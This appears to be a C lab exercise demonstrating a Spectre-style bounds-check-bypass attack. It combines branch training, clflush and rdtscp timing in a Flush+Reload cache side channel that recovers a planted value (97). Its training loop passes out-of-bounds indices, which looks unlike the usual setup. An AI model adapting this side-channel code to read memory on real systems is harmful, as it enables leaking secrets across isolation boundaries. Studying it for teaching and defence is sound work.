#include <x86intrin.h>
#include <stdio.h>

int size = 10;
uint8_t array[256 * 4096];
uint8_t temp = 0;

#define CACHE_HIT_THRESHOLD (80)
#define DELTA 1024

void victim(size_t x)
{
    if (x < size) {
        temp = array[x * 4096 + DELTA];
    }
}

void flushSideChannel()
{
    int i;

    /* Write to array to bring it to RAM to prevent COW */
    for (i = 0; i < 256; i++) {
        array[i * 4096 + DELTA] = 1;
    }
    /* Flush the values of the array from cache */
    for (i = 0; i < 256; i++) {
       _mm_clflush(&array[i * 4096 + DELTA]);
    }
}

void reloadSideChannel()
{
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;
    for (i = 0; i < 256; i++) {
        addr = &array[i * 4096 + DELTA];
        time1 = __rdtscp(&junk);
        junk = *addr;
        time2 = __rdtscp(&junk) - time1;
        if (time2 <= CACHE_HIT_THRESHOLD) {
            printf("array[%d * 4096 + %d] is in cache!\n", i, DELTA);
            printf("The secret is %d.\n", i);
        }
    }
}

int main()
{
    int i;
    /* The training procedure */
    for (i = 0; i < 10; i++) {
        _mm_clflush(&size);
        victim(i + 11);
    }

    /* Flush the probing array */
    flushSideChannel();

    /* Access the secret */
    _mm_clflush(&size);
    victim(97);

    /* Reload the probing array */
    reloadSideChannel();
    
    return 0;
}
